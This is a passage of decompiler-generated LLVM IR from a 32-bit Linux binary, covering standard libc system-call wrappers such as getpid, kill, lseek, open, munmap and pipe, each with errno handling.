  %v0_804f84d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f84d = sub i32 0, %v0_804f84d
  %v2_804f84f = inttoptr i32 %v1_804f848 to i32*
  store i32 %v1_804f84d, i32* %v2_804f84f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f854

dec_label_pc_804f854:                             ; preds = %entry, %dec_label_pc_804f848
  %v0_804f854 = phi i32 [ %v1_804f83d, %entry ], [ -1, %dec_label_pc_804f848 ]
  %v2_804f858 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f858, i32* @ebx, align 4
  ret i32 %v0_804f854

; uselistorder directives
  uselistorder i32 %v1_804f83d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f854, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804f85c = load i32, i32* @global_var_80672b4.157, align 4
  %v1_804f866 = icmp eq i32 %v0_804f85c, 0
  br i1 %v1_804f866, label %dec_label_pc_804f86c, label %dec_label_pc_804f86a

dec_label_pc_804f86a:                             ; preds = %entry
  br label %dec_label_pc_804f86c

dec_label_pc_804f86c:                             ; preds = %entry, %dec_label_pc_804f86a
  %storemerge = phi i32 [ %v0_804f85c, %dec_label_pc_804f86a ], [ 4096, %entry ]
  %v0_804f86c = phi i32 [ %v0_804f85c, %dec_label_pc_804f86a ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_804f86c

; uselistorder directives
  uselistorder label %dec_label_pc_804f86c, { 1, 0 }
}

define i32 @__libc_getpid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f870 = load i32, i32* @ebx, align 4
  store i32 %v0_804f870, i32* %stack_var_-4, align 4
  %v1_804f879 = call i32 @getpid(i32 %v0_804f870)
  store i32 %v1_804f879, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f879, -4095
  br i1 %tmp, label %dec_label_pc_804f890, label %dec_label_pc_804f884

dec_label_pc_804f884:                             ; preds = %entry
  %v0_804f884 = load i32, i32* %stack_var_-4, align 4
  %v1_804f884 = call i32 @__errno_location(i32 %v0_804f884)
  %v0_804f889 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f889 = sub i32 0, %v0_804f889
  %v2_804f88b = inttoptr i32 %v1_804f884 to i32*
  store i32 %v1_804f889, i32* %v2_804f88b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f890

dec_label_pc_804f890:                             ; preds = %entry, %dec_label_pc_804f884
  %v0_804f890 = phi i32 [ %v1_804f879, %entry ], [ -1, %dec_label_pc_804f884 ]
  %v2_804f894 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f894, i32* @ebx, align 4
  ret i32 %v0_804f890

; uselistorder directives
  uselistorder i32 %v1_804f879, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f890, { 1, 0 }
}

define i32 @getppid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f898 = load i32, i32* @ebx, align 4
  store i32 %v0_804f898, i32* %stack_var_-4, align 4
  %v1_804f8a1 = call i32 @getppid(i32 %v0_804f898)
  store i32 %v1_804f8a1, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f8a1, -4095
  br i1 %tmp, label %dec_label_pc_804f8b8, label %dec_label_pc_804f8ac

dec_label_pc_804f8ac:                             ; preds = %entry
  %v0_804f8ac = load i32, i32* %stack_var_-4, align 4
  %v1_804f8ac = call i32 @__errno_location(i32 %v0_804f8ac)
  %v0_804f8b1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f8b1 = sub i32 0, %v0_804f8b1
  %v2_804f8b3 = inttoptr i32 %v1_804f8ac to i32*
  store i32 %v1_804f8b1, i32* %v2_804f8b3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f8b8

dec_label_pc_804f8b8:                             ; preds = %entry, %dec_label_pc_804f8ac
  %v0_804f8b8 = phi i32 [ %v1_804f8a1, %entry ], [ -1, %dec_label_pc_804f8ac ]
  %v2_804f8bc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f8bc, i32* @ebx, align 4
  ret i32 %v0_804f8b8

; uselistorder directives
  uselistorder i32 %v1_804f8a1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @getppid, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f8b8, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f8c0 = load i32, i32* @ebx, align 4
  store i32 %v0_804f8c0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804f8d3 = call i32 @int80_syscall(i32 191)
  store i32 %v1_804f8d3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f8d3, -4095
  br i1 %tmp, label %dec_label_pc_804f8ec, label %dec_label_pc_804f8e0

dec_label_pc_804f8e0:                             ; preds = %entry
  %v0_804f8e0 = load i32, i32* %stack_var_-4, align 4
  %v1_804f8e0 = call i32 @__errno_location(i32 %v0_804f8e0)
  %v0_804f8e5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f8e5 = sub i32 0, %v0_804f8e5
  %v2_804f8e7 = inttoptr i32 %v1_804f8e0 to i32*
  store i32 %v1_804f8e5, i32* %v2_804f8e7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f8ec

dec_label_pc_804f8ec:                             ; preds = %entry, %dec_label_pc_804f8e0
  %v0_804f8ec = phi i32 [ %v1_804f8d3, %entry ], [ -1, %dec_label_pc_804f8e0 ]
  %v2_804f8f0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f8f0, i32* @ebx, align 4
  ret i32 %v0_804f8ec

; uselistorder directives
  uselistorder i32 %v1_804f8d3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f8ec, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f8f4 = load i32, i32* @ebx, align 4
  store i32 %v0_804f8f4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804f907 = call i32 @gettimeofday(i32 %v0_804f8f4, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804f907, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804f907, -4095
  br i1 %tmp, label %dec_label_pc_804f920, label %dec_label_pc_804f914

dec_label_pc_804f914:                             ; preds = %entry
  %v0_804f914 = load i32, i32* %stack_var_-4, align 4
  %v1_804f914 = call i32 @__errno_location(i32 %v0_804f914)
  %v0_804f919 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f919 = sub i32 0, %v0_804f919
  %v2_804f91b = inttoptr i32 %v1_804f914 to i32*
  store i32 %v1_804f919, i32* %v2_804f91b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f920

dec_label_pc_804f920:                             ; preds = %entry, %dec_label_pc_804f914
  %v0_804f920 = phi i32 [ %v4_804f907, %entry ], [ -1, %dec_label_pc_804f914 ]
  %v2_804f924 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f924, i32* @ebx, align 4
  ret i32 %v0_804f920

; uselistorder directives
  uselistorder i32 %v4_804f907, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f920, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f928 = load i32, i32* @edi, align 4
  store i32 %v0_804f928, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804f940 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804f948 = call i32 @ioctl(i32 %v0_804f940, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804f940, i32* @ebx, align 4
  store i32 %v3_804f948, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_804f948, -4095
  br i1 %tmp, label %dec_label_pc_804f960, label %dec_label_pc_804f954

dec_label_pc_804f954:                             ; preds = %entry
  %v1_804f954 = call i32 @__errno_location(i32 %v0_804f940)
  %v0_804f959 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f959 = sub i32 0, %v0_804f959
  %v2_804f95b = inttoptr i32 %v1_804f954 to i32*
  store i32 %v1_804f959, i32* %v2_804f95b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f960

dec_label_pc_804f960:                             ; preds = %entry, %dec_label_pc_804f954
  %v0_804f960 = phi i32 [ %v3_804f948, %entry ], [ -1, %dec_label_pc_804f954 ]
  %v2_804f965 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f965, i32* @edi, align 4
  ret i32 %v0_804f960

; uselistorder directives
  uselistorder i32 %v3_804f948, { 1, 0, 2 }
  uselistorder i32 %v0_804f940, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f960, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f968 = load i32, i32* @ebx, align 4
  store i32 %v0_804f968, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804f97b = call i32 @kill(i32 %v0_804f968, i32 %tmp4)
  store i32 %v2_804f97b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804f97b, -4095
  br i1 %tmp, label %dec_label_pc_804f994, label %dec_label_pc_804f988

dec_label_pc_804f988:                             ; preds = %entry
  %v0_804f988 = load i32, i32* %stack_var_-4, align 4
  %v1_804f988 = call i32 @__errno_location(i32 %v0_804f988)
  %v0_804f98d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f98d = sub i32 0, %v0_804f98d
  %v2_804f98f = inttoptr i32 %v1_804f988 to i32*
  store i32 %v1_804f98d, i32* %v2_804f98f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f994

dec_label_pc_804f994:                             ; preds = %entry, %dec_label_pc_804f988
  %v0_804f994 = phi i32 [ %v2_804f97b, %entry ], [ -1, %dec_label_pc_804f988 ]
  %v2_804f996 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f996, i32* @edx, align 4
  %v2_804f998 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f998, i32* @ebx, align 4
  ret i32 %v0_804f994

; uselistorder directives
  uselistorder i32 %v2_804f97b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @kill, { 6, 4, 0, 1, 5, 3, 2 }
  uselistorder label %dec_label_pc_804f994, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f99e = load i32, i32* @ebx, align 4
  store i32 %v0_804f99e, i32* %stack_var_-12, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v2_804f9b2 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804f9b2, i32* %esi.global-to-local, align 4
  %v1_804f9c9 = call i32 @int80_syscall(i32 140)
  store i32 %v1_804f9c9, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_804f9c9, -4095
  br i1 %tmp16, label %dec_label_pc_804f9e3, label %dec_label_pc_804f9d5

dec_label_pc_804f9d5:                             ; preds = %entry
  %v2_804f9b6 = ashr i32 %arg3, 31
  %v1_804f9d5 = call i32 @__errno_location(i32 %v2_804f9b6)
  %v0_804f9da = load i32, i32* %esi.global-to-local, align 4
  %v1_804f9da = sub i32 0, %v0_804f9da
  %v2_804f9dc = inttoptr i32 %v1_804f9d5 to i32*
  store i32 %v1_804f9da, i32* %v2_804f9dc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f9e7

dec_label_pc_804f9e3:                             ; preds = %entry
  %v1_804f9e3 = icmp eq i32 %v1_804f9c9, 0
  br i1 %v1_804f9e3, label %dec_label_pc_804f9ec, label %dec_label_pc_804f9e7

dec_label_pc_804f9e7:                             ; preds = %dec_label_pc_804f9e3, %dec_label_pc_804f9d5
  %v0_804f9e7 = phi i32 [ %v1_804f9c9, %dec_label_pc_804f9e3 ], [ -1, %dec_label_pc_804f9d5 ]
  %v1_804f9e9 = ashr i32 %v0_804f9e7, 31
  br label %dec_label_pc_804f9f4

dec_label_pc_804f9ec:                             ; preds = %dec_label_pc_804f9e3
  %v3_804f9ec = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804f9f4

dec_label_pc_804f9f4:                             ; preds = %dec_label_pc_804f9e7, %dec_label_pc_804f9ec
  %v0_804f9fa = phi i32 [ %v0_804f9e7, %dec_label_pc_804f9e7 ], [ %v3_804f9ec, %dec_label_pc_804f9ec ]
  %storemerge = phi i32 [ %v1_804f9e9, %dec_label_pc_804f9e7 ], [ %tmp, %dec_label_pc_804f9ec ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_804f9f7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f9f7, i32* @ebx, align 4
  ret i32 %v0_804f9fa

; uselistorder directives
  uselistorder i32 %v1_804f9c9, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804f9f4, { 1, 0 }
}

define i32 @_longjmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v1_804fa09 = add i32 %arg1, 24
  %v2_804fa09 = inttoptr i32 %v1_804fa09 to i32*
  %v3_804fa09 = load i32, i32* %v2_804fa09, align 4
  %v4_804fa09 = icmp eq i32 %v3_804fa09, 0
  br i1 %v4_804fa09, label %dec_label_pc_804fa20, label %dec_label_pc_804fa0f

dec_label_pc_804fa0f:                             ; preds = %entry
  %v1_804fa0f = add i32 %arg1, 28
  %v3_804fa18 = inttoptr i32 %v1_804fa0f to %_TYPEDEF_sigset_t*
  %v4_804fa18 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804fa18, i32 0)
  %v0_804fa20.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fa20

dec_label_pc_804fa20:                             ; preds = %entry, %dec_label_pc_804fa0f
  %v0_804fa24 = phi i32 [ %arg2, %entry ], [ %v0_804fa20.pre, %dec_label_pc_804fa0f ]
  %.0 = phi i32 [ undef, %entry ], [ %v4_804fa18, %dec_label_pc_804fa0f ]
  %v1_804fa20 = icmp eq i32 %v0_804fa24, 0
  %v1_804fa22 = icmp eq i1 %v1_804fa20, false
  br i1 %v1_804fa22, label %dec_label_pc_804fa26, label %dec_label_pc_804fa24

dec_label_pc_804fa24:                             ; preds = %dec_label_pc_804fa20
  %v1_804fa24 = and i32 %v0_804fa24, -256
  %v2_804fa24 = or i32 %v1_804fa24, 1
  br label %dec_label_pc_804fa26

dec_label_pc_804fa26:                             ; preds = %dec_label_pc_804fa20, %dec_label_pc_804fa24
  %v0_804fa28 = phi i32 [ %v0_804fa24, %dec_label_pc_804fa20 ], [ %v2_804fa24, %dec_label_pc_804fa24 ]
  %v0_804fa29 = load i32, i32* @esi, align 4
  %v4_804fa2a = inttoptr i32 %v0_804fa29 to i32*
  %v5_804fa2a = call i32 @__longjmp(i32* %v4_804fa2a, i32 %v0_804fa28, i32 %.0, i32 %.0)
  ret i32 %v5_804fa2a

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fa26, { 1, 0 }
  uselistorder label %dec_label_pc_804fa20, { 1, 0 }
}

define i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fa30 = load i32, i32* @edi, align 4
  store i32 %v0_804fa30, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_804fa40 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fa48 = call i32 @lseek(i32 %v0_804fa40)
  store i32 %v0_804fa40, i32* @ebx, align 4
  store i32 %v1_804fa48, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fa48, -4095
  br i1 %tmp, label %dec_label_pc_804fa60, label %dec_label_pc_804fa54

dec_label_pc_804fa54:                             ; preds = %entry
  %v1_804fa54 = call i32 @__errno_location(i32 %v0_804fa40)
  %v0_804fa59 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fa59 = sub i32 0, %v0_804fa59
  %v2_804fa5b = inttoptr i32 %v1_804fa54 to i32*
  store i32 %v1_804fa59, i32* %v2_804fa5b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fa60

dec_label_pc_804fa60:                             ; preds = %entry, %dec_label_pc_804fa54
  %v0_804fa60 = phi i32 [ %v1_804fa48, %entry ], [ -1, %dec_label_pc_804fa54 ]
  %v2_804fa64 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fa64, i32* @edi, align 4
  ret i32 %v0_804fa60

; uselistorder directives
  uselistorder i32 %v1_804fa48, { 1, 0, 2 }
  uselistorder i32 %v0_804fa40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fa60, { 1, 0 }
}

define i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fa68 = load i32, i32* @edi, align 4
  store i32 %v0_804fa68, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_804fa78 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fa80 = call i32 @msync(i32 %v0_804fa78)
  store i32 %v1_804fa80, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fa80, -4095
  br i1 %tmp, label %dec_label_pc_804fa98, label %dec_label_pc_804fa8c

dec_label_pc_804fa8c:                             ; preds = %entry
  %v1_804fa8c = call i32 @__errno_location(i32 %v0_804fa78)
  %v0_804fa91 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fa91 = sub i32 0, %v0_804fa91
  %v2_804fa93 = inttoptr i32 %v1_804fa8c to i32*
  store i32 %v1_804fa91, i32* %v2_804fa93, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fa98

dec_label_pc_804fa98:                             ; preds = %entry, %dec_label_pc_804fa8c
  %v0_804fa98 = phi i32 [ %v1_804fa80, %entry ], [ -1, %dec_label_pc_804fa8c ]
  %v2_804fa9c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fa9c, i32* @edi, align 4
  ret i32 %v0_804fa98

; uselistorder directives
  uselistorder i32 %v1_804fa80, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fa98, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804faa0 = load i32, i32* @ebx, align 4
  store i32 %v0_804faa0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804fab3 = call i32 @munmap(i32 %v0_804faa0, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804fab3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804fab3, -4095
  br i1 %tmp, label %dec_label_pc_804facc, label %dec_label_pc_804fac0

dec_label_pc_804fac0:                             ; preds = %entry
  %v0_804fac0 = load i32, i32* %stack_var_-4, align 4
  %v1_804fac0 = call i32 @__errno_location(i32 %v0_804fac0)
  %v0_804fac5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fac5 = sub i32 0, %v0_804fac5
  %v2_804fac7 = inttoptr i32 %v1_804fac0 to i32*
  store i32 %v1_804fac5, i32* %v2_804fac7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804facc

dec_label_pc_804facc:                             ; preds = %entry, %dec_label_pc_804fac0
  %v0_804facc = phi i32 [ %v4_804fab3, %entry ], [ -1, %dec_label_pc_804fac0 ]
  %v2_804face = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804face, i32* @edx, align 4
  %v2_804fad0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fad0, i32* @ebx, align 4
  ret i32 %v0_804facc

; uselistorder directives
  uselistorder i32 %v4_804fab3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804facc, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fad4 = load i32, i32* @ebx, align 4
  store i32 %v0_804fad4, i32* %stack_var_-4, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804fae7 = call i32 @nanosleep(i32 %v0_804fad4, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804fae7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804fae7, -4095
  br i1 %tmp, label %dec_label_pc_804fb00, label %dec_label_pc_804faf4

dec_label_pc_804faf4:                             ; preds = %entry
  %v0_804faf4 = load i32, i32* %stack_var_-4, align 4
  %v1_804faf4 = call i32 @__errno_location(i32 %v0_804faf4)
  %v0_804faf9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804faf9 = sub i32 0, %v0_804faf9
  %v2_804fafb = inttoptr i32 %v1_804faf4 to i32*
  store i32 %v1_804faf9, i32* %v2_804fafb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb00

dec_label_pc_804fb00:                             ; preds = %entry, %dec_label_pc_804faf4
  %v0_804fb00 = phi i32 [ %v4_804fae7, %entry ], [ -1, %dec_label_pc_804faf4 ]
  %v2_804fb04 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fb04, i32* @ebx, align 4
  ret i32 %v0_804fb00

; uselistorder directives
  uselistorder i32 %v4_804fae7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fb00, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804fb08 = load i32, i32* @edi, align 4
  %v0_804fb09 = load i32, i32* @ebx, align 4
  %v4_804fb0f = sext i8 %arg2 to i32
  store i32 %v4_804fb0f, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_804fb17 = and i8 %arg2, 64
  %v3_804fb17 = icmp eq i8 %v2_804fb17, 0
  br i1 %v3_804fb17, label %dec_label_pc_804fb28, label %dec_label_pc_804fb1c

dec_label_pc_804fb1c:                             ; preds = %entry
  br label %dec_label_pc_804fb28

dec_label_pc_804fb28:                             ; preds = %entry, %dec_label_pc_804fb1c
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fb33 = call i32 @open(i32 %v0_804fb09)
  store i32 %v1_804fb33, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fb33, -4095
  br i1 %tmp, label %dec_label_pc_804fb4b, label %dec_label_pc_804fb3f

dec_label_pc_804fb3f:                             ; preds = %dec_label_pc_804fb28
  %v1_804fb3f = call i32 @__errno_location(i32 %v0_804fb09)
  %v0_804fb44 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fb44 = sub i32 0, %v0_804fb44
  %v2_804fb46 = inttoptr i32 %v1_804fb3f to i32*
  store i32 %v1_804fb44, i32* %v2_804fb46, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb4b

dec_label_pc_804fb4b:                             ; preds = %dec_label_pc_804fb28, %dec_label_pc_804fb3f
  %v0_804fb4b = phi i32 [ %v1_804fb33, %dec_label_pc_804fb28 ], [ -1, %dec_label_pc_804fb3f ]
  store i32 %v0_804fb09, i32* @ebx, align 4
  store i32 %v0_804fb08, i32* @edi, align 4
  ret i32 %v0_804fb4b

; uselistorder directives
  uselistorder i32 %v1_804fb33, { 1, 0, 2 }
  uselistorder i32 %v0_804fb09, { 1, 0, 2 }
  uselistorder i8 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804fb4b, { 1, 0 }
  uselistorder label %dec_label_pc_804fb28, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804fb63 = call i32 @__libc_open(i32 %arg1, i8 65, i32 %arg2)
  ret i32 %v4_804fb63

; uselistorder directives
  uselistorder i8 65, { 1, 0 }
}

define i32 @__GI___libc_open64(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_804fb75 = and i8 %arg2, 64
  %v3_804fb75 = icmp eq i8 %v2_804fb75, 0
  br i1 %v3_804fb75, label %dec_label_pc_804fb86, label %dec_label_pc_804fb7a

dec_label_pc_804fb7a:                             ; preds = %entry
  br label %dec_label_pc_804fb86

dec_label_pc_804fb86:                             ; preds = %entry, %dec_label_pc_804fb7a
  %v0_804fb8a = phi i32 [ 0, %entry ], [ %arg3, %dec_label_pc_804fb7a ]
  %v4_804fb90 = call i32 @__libc_open(i32 %arg1, i8 %arg2, i32 %v0_804fb8a)
  ret i32 %v4_804fb90

; uselistorder directives
  uselistorder label %dec_label_pc_804fb86, { 1, 0 }
}

define i32 @__libc_pause() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb9c = load i32, i32* @ebx, align 4
  store i32 %v0_804fb9c, i32* %stack_var_-4, align 4
  %v1_804fba5 = call i32 @pause(i32 %v0_804fb9c)
  store i32 %v1_804fba5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fba5, -4095
  br i1 %tmp, label %dec_label_pc_804fbbc, label %dec_label_pc_804fbb0

dec_label_pc_804fbb0:                             ; preds = %entry
  %v0_804fbb0 = load i32, i32* %stack_var_-4, align 4
  %v1_804fbb0 = call i32 @__errno_location(i32 %v0_804fbb0)
  %v0_804fbb5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbb5 = sub i32 0, %v0_804fbb5
  %v2_804fbb7 = inttoptr i32 %v1_804fbb0 to i32*
  store i32 %v1_804fbb5, i32* %v2_804fbb7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fbbc

dec_label_pc_804fbbc:                             ; preds = %entry, %dec_label_pc_804fbb0
  %v0_804fbbc = phi i32 [ %v1_804fba5, %entry ], [ -1, %dec_label_pc_804fbb0 ]
  %v2_804fbc0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fbc0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fbbc

; uselistorder directives
  uselistorder i32 %v1_804fba5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbbc, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbc4 = load i32, i32* @edi, align 4
  store i32 %v0_804fbc4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fbcc = load i32, i32* @ebx, align 4
  %v1_804fbd4 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804fbd4 = call i32 @pipe([2 x i32] %v1_804fbd4)
